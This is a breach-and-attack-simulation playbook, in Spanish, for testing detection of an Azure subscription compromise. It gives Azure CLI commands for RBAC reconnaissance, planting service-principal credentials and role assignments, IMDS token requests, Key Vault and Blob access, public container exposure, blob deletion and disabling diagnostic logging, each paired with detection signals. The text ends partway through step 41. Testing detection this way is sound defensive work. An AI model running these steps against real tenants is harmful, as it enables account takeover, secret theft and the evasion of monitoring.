# Azure Subscription and Resource Compromise

| | |
|---|---|
| **Status** | active |
| **Severity** | critical |
| **Target environment** | Microsoft Azure subscription con Entra ID, Azure RBAC, Storage, Key Vault, Functions, VM/Automation opcionales y Monitor |
| **MITRE Tactic** | TA0001 — Initial Access |
| **MITRE Technique** | T1078.004 — Cloud Accounts |
| **Tags** | `azure` · `entra-id` · `azure-rbac` · `key-vault` · `blob-storage` · `functions` · `managed-identity` · `bas` · `atomic` |
| **Autor** | Sergio Javier Mazariego Guevara |
| **Creado** | 2026-07-20T22:52:38.482Z |
| **Actualizado** | 2026-07-20T22:52:38.482Z |

## Descripción

Escenario atómico que modela reconocimiento de Azure Resource Manager, persistencia y elevación mediante service principals y Azure RBAC, acceso a Key Vault y Blob Storage, abuso de cómputo administrado, manipulación de controles y recuperación de impactos canary.

## Steps

### 1. Validar identidad y suscripción Azure

**MITRE:** T1078.004

Confirmar la identidad Azure CLI activa y la suscripción autorizada.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az account show --output json | tee "$STATE/azure-account.json"
```

**Resultado esperado:**

Azure devuelve tenant, subscription, user/service principal y estado.

**Señales de detección:**

Entra sign-in logs y Azure Activity Log; principal, appId, IP, subscription y client.

### 2. Enumerar tenants accesibles

**MITRE:** T1526

Enumerar tenants visibles para la identidad comprometida.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az account tenant list --output json | tee "$STATE/azure-tenants.json"
```

**Resultado esperado:**

Se obtienen tenants accesibles.

**Señales de detección:**

Entra sign-ins y llamadas de Azure Resource Manager desde la identidad BAS.

### 3. Enumerar suscripciones accesibles

**MITRE:** T1526

Enumerar suscripciones asociadas a la identidad BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az account list --all --output json | tee "$STATE/azure-subscriptions.json"
```

**Resultado esperado:**

Se obtienen suscripciones y estados visibles.

**Señales de detección:**

Azure Resource Manager subscription discovery; principal y tenant.

### 4. Enumerar resource groups

**MITRE:** T1526

Enumerar resource groups usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az group list --output json | tee "$STATE/azure-resource-groups.json"
```

**Resultado esperado:**

Resource groups visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 5. Enumerar asignaciones Azure RBAC

**MITRE:** T1069.003

Enumerar asignaciones Azure RBAC usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az role assignment list --all --include-inherited --output json | tee "$STATE/azure-role-assignments.json"
```

**Resultado esperado:**

Asignaciones RBAC visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 6. Enumerar definiciones de roles

**MITRE:** T1069.003

Enumerar definiciones de roles usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az role definition list --output json | tee "$STATE/azure-role-definitions.json"
```

**Resultado esperado:**

Roles built-in y custom visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 7. Enumerar Azure Policy assignments

**MITRE:** T1526

Enumerar Azure Policy assignments usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az policy assignment list --output json | tee "$STATE/azure-policy-assignments.json"
```

**Resultado esperado:**

Policies asignadas en el scope.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 8. Enumerar management locks

**MITRE:** T1526

Enumerar management locks usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az lock list --output json | tee "$STATE/azure-locks.json"
```

**Resultado esperado:**

Locks visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 9. Enumerar managed identities

**MITRE:** T1087.004

Enumerar managed identities usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az identity list --output json | tee "$STATE/azure-identities.json"
```

**Resultado esperado:**

Managed identities visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 10. Enumerar Storage Accounts

**MITRE:** T1619

Enumerar Storage Accounts usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az storage account list --output json | tee "$STATE/azure-storage-accounts.json"
```

**Resultado esperado:**

Storage accounts visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 11. Enumerar Key Vaults

**MITRE:** T1526

Enumerar Key Vaults usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az keyvault list --output json | tee "$STATE/azure-keyvaults.json"
```

**Resultado esperado:**

Key Vaults visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 12. Enumerar máquinas virtuales

**MITRE:** T1526

Enumerar máquinas virtuales usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az vm list -d --output json | tee "$STATE/azure-vms.json"
```

**Resultado esperado:**

VMs visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 13. Enumerar Function Apps

**MITRE:** T1526

Enumerar Function Apps usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az functionapp list --output json | tee "$STATE/azure-functions.json"
```

**Resultado esperado:**

Function Apps visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 14. Enumerar Automation Accounts

**MITRE:** T1526

Enumerar Automation Accounts usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az resource list --resource-type Microsoft.Automation/automationAccounts --output json | tee "$STATE/azure-automation.json"
```

**Resultado esperado:**

Automation Accounts visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 15. Enumerar clústeres AKS

**MITRE:** T1526

Enumerar clústeres AKS usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az aks list --output json | tee "$STATE/azure-aks.json"
```

**Resultado esperado:**

AKS clusters visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 16. Enumerar planes de Microsoft Defender for Cloud

**MITRE:** T1526

Enumerar planes de Microsoft Defender for Cloud usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az security pricing list --output json | tee "$STATE/azure-defender-pricing.json"
```

**Resultado esperado:**

Planes de seguridad visibles.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 17. Enumerar alertas de Activity Log

**MITRE:** T1526

Enumerar alertas de Activity Log usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az monitor activity-log alert list --output json | tee "$STATE/azure-activity-alerts.json"
```

**Resultado esperado:**

Alertas de actividad configuradas.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 18. Enumerar diagnostic settings del recurso canary

**MITRE:** T1526

Enumerar diagnostic settings del recurso canary usando Azure CLI.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az monitor diagnostic-settings list --resource "${STRIKE_DIAGNOSTIC_RESOURCE_ID}" --output json | tee "$STATE/azure-diagnostics.json"
```

**Resultado esperado:**

Diagnostic settings del recurso canary.

**Señales de detección:**

Azure Activity Log y ARM request; principal, subscription, resource provider, scope y resultado.

### 19. Crear service principal Azure canary

**MITRE:** T1136.003

Crear una identidad de aplicación temporal sin asignación de rol inicial.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

NAME="STRIKE-BAS-SP-$(date +%s)"
az ad sp create-for-rbac --name "$NAME" --skip-assignment --output json | tee "$STATE/azure-sp-created.json"
chmod 600 "$STATE/azure-sp-created.json"
```

**Resultado esperado:**

Se crea app/service principal y credencial temporal sin acceso a recursos.

**Señales de detección:**

Entra audit: Add application/service principal/credentials; actor, appId y object ID.

### 20. Agregar credencial a aplicación Azure canary

**MITRE:** T1098.001

Agregar un client secret de corta duración a la aplicación canary.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

END="$(date -u -d '+30 minutes' +%Y-%m-%dT%H:%M:%SZ)"
az ad app credential reset --id "${STRIKE_CANARY_SP_APP_ID}" --append --display-name "STRIKE-BAS-secret" --end-date "$END" --output json | tee "$STATE/azure-app-secret.json"
chmod 600 "$STATE/azure-app-secret.json"
```

**Resultado esperado:**

Se agrega una credencial temporal y se conserva keyId para cleanup.

**Señales de detección:**

Entra audit: Update application credentials; appId, keyId y actor.

### 21. Agregar federated identity credential canary

**MITRE:** T1098.001

Crear una relación OIDC acotada entre una aplicación BAS y un subject canary.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

cat >"$STATE/azure-fic.json" <<JSON
{"name":"STRIKE-BAS-FIC","issuer":"${STRIKE_OIDC_ISSUER}","subject":"${STRIKE_OIDC_SUBJECT}","audiences":["api://AzureADTokenExchange"],"description":"STRIKE BAS"}
JSON
az ad app federated-credential create --id "${STRIKE_CANARY_SP_APP_ID}" --parameters "$STATE/azure-fic.json" --output json | tee "$STATE/azure-fic-created.json"
```

**Resultado esperado:**

Se crea una credencial federada limitada al issuer/subject configurado.

**Señales de detección:**

Entra audit: Add federated identity credential; app, issuer, subject y actor.

### 22. Asignar Reader al service principal canary

**MITRE:** T1098.003

Crear una asignación Azure RBAC de Reader limitada al scope BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az role assignment create --assignee "${STRIKE_CANARY_SP_APP_ID}" --role "Reader" --scope "/subscriptions/${STRIKE_SUBSCRIPTION_ID}" --output json | tee "$STATE/azure-assign-reader-role.json"
```

**Resultado esperado:**

El service principal recibe Reader únicamente en el scope configurado.

**Señales de detección:**

Azure Activity Log: Microsoft.Authorization/roleAssignments/write; actor, assignee, role y scope.

### 23. Asignar Contributor en resource group canary

**MITRE:** T1098.003

Crear una asignación Azure RBAC de Contributor limitada al scope BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az role assignment create --assignee "${STRIKE_CANARY_SP_APP_ID}" --role "Contributor" --scope "/subscriptions/${STRIKE_SUBSCRIPTION_ID}/resourceGroups/${STRIKE_RESOURCE_GROUP}" --output json | tee "$STATE/azure-assign-contributor-canary-rg.json"
```

**Resultado esperado:**

El service principal recibe Contributor únicamente en el scope configurado.

**Señales de detección:**

Azure Activity Log: Microsoft.Authorization/roleAssignments/write; actor, assignee, role y scope.

### 24. Crear custom role Azure canary

**MITRE:** T1098.003

Crear un role definition mínimo con acceso de lectura exclusivo al resource group BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

cat >"$STATE/azure-custom-role.json" <<JSON
{"Name":"${STRIKE_CANARY_ROLE_NAME}","IsCustom":true,"Description":"STRIKE BAS limited role","Actions":["Microsoft.Resources/subscriptions/resourceGroups/read","Microsoft.Storage/storageAccounts/read"],"NotActions":[],"DataActions":[],"NotDataActions":[],"AssignableScopes":["/subscriptions/${STRIKE_SUBSCRIPTION_ID}/resourceGroups/${STRIKE_RESOURCE_GROUP}"]}
JSON
az role definition create --role-definition "$STATE/azure-custom-role.json" --output json | tee "$STATE/azure-custom-role-created.json"
```

**Resultado esperado:**

Se crea una definición de rol mínima y acotada.

**Señales de detección:**

Azure Activity Log: roleDefinitions/write; actions, assignableScopes y actor.

### 25. Solicitar token de managed identity desde IMDS

**MITRE:** T1528

Desde una VM canary, solicitar un token ARM para la user-assigned managed identity BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

curl -fsS -H Metadata:true \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F&client_id=${STRIKE_MANAGED_IDENTITY_CLIENT_ID}" \
 | jq '{token_type,expires_in,resource}' | tee "$STATE/azure-imds-token-metadata.json"
```

**Resultado esperado:**

IMDS emite un token para la managed identity sin imprimir el access token.

**Señales de detección:**

Azure sign-in logs for service principals/managed identities; VM context, resource y clientId.

### 26. Enumerar secretos de Key Vault canary

**MITRE:** T1526

Enumerar metadatos de secretos visibles en el vault BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az keyvault secret list --vault-name "${STRIKE_KEYVAULT_NAME}" --output json | tee "$STATE/azure-kv-secret-list.json"
```

**Resultado esperado:**

Se obtienen nombres y metadatos, no necesariamente valores.

**Señales de detección:**

Key Vault audit logs: SecretList; caller, vault, IP y result.

### 27. Obtener secreto canary de Key Vault

**MITRE:** T1555.006

Recuperar el valor sintético de un secreto autorizado.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az keyvault secret show --vault-name "${STRIKE_KEYVAULT_NAME}" --name "${STRIKE_KEYVAULT_SECRET}" --query "{id:id,name:name}" --output json | tee "$STATE/azure-kv-secret-metadata.json"
```

**Resultado esperado:**

Se confirma acceso al secreto sin imprimir el valor en consola.

**Señales de detección:**

Key Vault audit logs: SecretGet; identity, vault, secret, IP y network context.

### 28. Enumerar contenedores Blob

**MITRE:** T1619

Enumerar containers del storage account canary usando Entra auth.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az storage container list --account-name "${STRIKE_STORAGE_ACCOUNT}" --auth-mode login --output json | tee "$STATE/azure-containers.json"
```

**Resultado esperado:**

Se listan contenedores visibles.

**Señales de detección:**

StorageBlobLogs/ListContainers; principal, account, IP y auth type.

### 29. Enumerar blobs del contenedor canary

**MITRE:** T1619

Enumerar objetos del contenedor BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az storage blob list --account-name "${STRIKE_STORAGE_ACCOUNT}" --container-name "${STRIKE_STORAGE_CONTAINER}" --auth-mode login --output json | tee "$STATE/azure-blobs.json"
```

**Resultado esperado:**

Se listan blobs y metadatos.

**Señales de detección:**

StorageBlobLogs/ListBlobs; identity, container y request volume.

### 30. Descargar blob canary

**MITRE:** T1530

Descargar un objeto sintético para validar acceso al data plane.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az storage blob download --account-name "${STRIKE_STORAGE_ACCOUNT}" --container-name "${STRIKE_STORAGE_CONTAINER}" --name "${STRIKE_STORAGE_BLOB}" --file "$STATE/azure-canary-download.bin" --auth-mode login --overwrite --output json
```

**Resultado esperado:**

El blob sintético se descarga al state local.

**Señales de detección:**

StorageBlobLogs/GetBlob; identity, blob, bytes, IP y user agent.

### 31. Generar SAS de corta duración para container canary

**MITRE:** T1098.001

Generar un user delegation SAS read-only de diez minutos y no imprimirlo.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

EXPIRY="$(date -u -d '+10 minutes' +%Y-%m-%dT%H:%MZ)"
SAS="$(az storage container generate-sas --account-name "${STRIKE_STORAGE_ACCOUNT}" --name "${STRIKE_STORAGE_CONTAINER}" --permissions rl --expiry "$EXPIRY" --auth-mode login --as-user -o tsv)"
printf '%s' "$SAS" >"$STATE/azure-container.sas"
chmod 600 "$STATE/azure-container.sas"
echo '{"sas_created":true,"permissions":"rl"}'
```

**Resultado esperado:**

Se crea un SAS efímero read/list almacenado localmente con permisos 600.

**Señales de detección:**

Storage control/data logs y Entra token activity; generación de user delegation key/SAS.

### 32. Subir blob modificado canary

**MITRE:** T1565.001

Crear un objeto sintético modificado sin sobrescribir datos del cliente.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

printf 'STRIKE-BAS modified blob %s\n' "$(date -u +%FT%TZ)" >"$STATE/STRIKE-BAS-modified.txt"
az storage blob upload --account-name "${STRIKE_STORAGE_ACCOUNT}" --container-name "${STRIKE_STORAGE_CONTAINER}" --name "STRIKE-BAS-modified.txt" --file "$STATE/STRIKE-BAS-modified.txt" --auth-mode login --overwrite --output json
```

**Resultado esperado:**

Se crea el blob STRIKE-BAS-modified.txt.

**Señales de detección:**

StorageBlobLogs/PutBlob; identity, bytes, container, blob e IP.

### 33. Habilitar acceso público sobre container canary

**MITRE:** T1567.002

Modificar temporalmente el nivel de acceso del container BAS a blob y restaurarlo.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az storage container show --account-name "${STRIKE_STORAGE_ACCOUNT}" --name "${STRIKE_STORAGE_CONTAINER}" --auth-mode login --output json >"$STATE/azure-container-before.json"
az storage container set-permission --account-name "${STRIKE_STORAGE_ACCOUNT}" --name "${STRIKE_STORAGE_CONTAINER}" --public-access blob --auth-mode login --output json
```

**Resultado esperado:**

El container canary permite lectura pública de blobs si la cuenta no lo bloquea.

**Señales de detección:**

Azure Activity/Storage logs: SetContainerACL; publicAccess y caller. Defender for Cloud exposure alerts.

### 34. Eliminar blob versionado canary

**MITRE:** T1485

Eliminar el blob sintético original en una cuenta con soft delete/versioning para validar recuperación.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_IMPACT:-false}" = "true" ] || { echo "Guardrail STRIKE_ALLOW_IMPACT no habilitado" >&2; exit 91; }
az storage blob delete --account-name "${STRIKE_STORAGE_ACCOUNT}" --container-name "${STRIKE_STORAGE_CONTAINER}" --name "${STRIKE_STORAGE_BLOB}" --auth-mode login --output json
```

**Resultado esperado:**

El blob queda soft-deleted o aparece una versión eliminada recuperable.

**Señales de detección:**

StorageBlobLogs/DeleteBlob; identity, blob, delete type y retention policy.

### 35. Invocar Azure Function canary

**MITRE:** T1648

Invocar una Function HTTP del laboratorio para validar ejecución serverless.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

curl -fsS --max-time 60 "${STRIKE_FUNCTION_URL}?marker=STRIKE-BAS" | tee "$STATE/azure-function-response.txt"
```

**Resultado esperado:**

La función devuelve el marcador esperado.

**Señales de detección:**

Function App HTTP/Application Insights logs; caller IP, invocation ID y managed identity activity.

### 36. Modificar app setting de Function canary

**MITRE:** T1648

Agregar temporalmente una configuración STRIKE_BAS_MODE y restaurar el estado.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az functionapp config appsettings list -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_FUNCTION_APP}" --output json >"$STATE/azure-function-settings-before.json"
az functionapp config appsettings set -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_FUNCTION_APP}" --settings STRIKE_BAS_MODE=enabled --output json
```

**Resultado esperado:**

STRIKE_BAS_MODE aparece en la configuración de la Function.

**Señales de detección:**

Azure Activity Log: config/appsettings write; actor, function app y changed properties.

### 37. Ejecutar Run Command en VM canary

**MITRE:** T1059.009

Usar el plano de administración Azure para ejecutar un comando inocuo en una VM BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az vm run-command invoke -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_VM_NAME}" --command-id RunShellScript --scripts 'echo STRIKE-BAS-RUN-COMMAND; id' --output json | tee "$STATE/azure-vm-run-command.json"
```

**Resultado esperado:**

La VM devuelve el marcador y contexto del usuario local.

**Señales de detección:**

Azure Activity Log: virtualMachines/runCommand/action; VM, caller, IP y Guest Agent logs.

### 38. Iniciar runbook Automation canary

**MITRE:** T1059.009

Ejecutar un runbook BAS que únicamente registra un marcador.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az automation runbook start -g "${STRIKE_RESOURCE_GROUP}" --automation-account-name "${STRIKE_AUTOMATION_ACCOUNT}" --name "${STRIKE_RUNBOOK_NAME}" --output json | tee "$STATE/azure-runbook-job.json"
```

**Resultado esperado:**

Se crea un job del runbook canary.

**Señales de detección:**

Azure Activity Log y Automation job logs; runbook, caller, job ID y output.

### 39. Crear regla NSG permisiva canary

**MITRE:** T1686.001

Agregar temporalmente una regla inbound sobre un NSG aislado que solo apunta a una subnet/NIC BAS.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_MUTATION:-false}" = "true" ] || { echo "Guardrail no habilitado" >&2; exit 91; }
az network nsg rule create -g "${STRIKE_RESOURCE_GROUP}" --nsg-name "${STRIKE_NSG_NAME}" -n STRIKE-BAS-Allow --priority 4090 --direction Inbound --access Allow --protocol Tcp --source-address-prefixes "${STRIKE_SOURCE_CIDR}" --destination-port-ranges 65000 --output json
```

**Resultado esperado:**

La regla STRIKE-BAS-Allow existe con puerto y source CIDR canary.

**Señales de detección:**

Azure Activity Log: securityRules/write; source, destination, priority y actor. Defender for Cloud network findings.

### 40. Eliminar diagnostic setting canary

**MITRE:** T1685.002

Eliminar temporalmente un diagnostic setting de un recurso BAS y restaurarlo mediante la API ARM.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_SERVICE_INTERRUPTION:-false}" = "true" ] || { echo "Guardrail no habilitado" >&2; exit 91; }
ID="${STRIKE_DIAGNOSTIC_RESOURCE_ID}/providers/Microsoft.Insights/diagnosticSettings/${STRIKE_DIAGNOSTIC_NAME}"
az rest --method get --url "https://management.azure.com${ID}?api-version=2021-05-01-preview" >"$STATE/azure-diagnostic-before.json"
az rest --method delete --url "https://management.azure.com${ID}?api-version=2021-05-01-preview"
```

**Resultado esperado:**

El diagnostic setting canary deja de existir temporalmente.

**Señales de detección:**

Azure Activity Log: diagnosticSettings/delete; resource, setting y actor. Alerta desde suscripción/Log Analytics independiente.

### 41. Deshabilitar alerta de Activity Log canary

**MITRE:** T1685

Deshabilitar temporalmente una alerta BAS y restaurarla.

```bash
set -euo pipefail
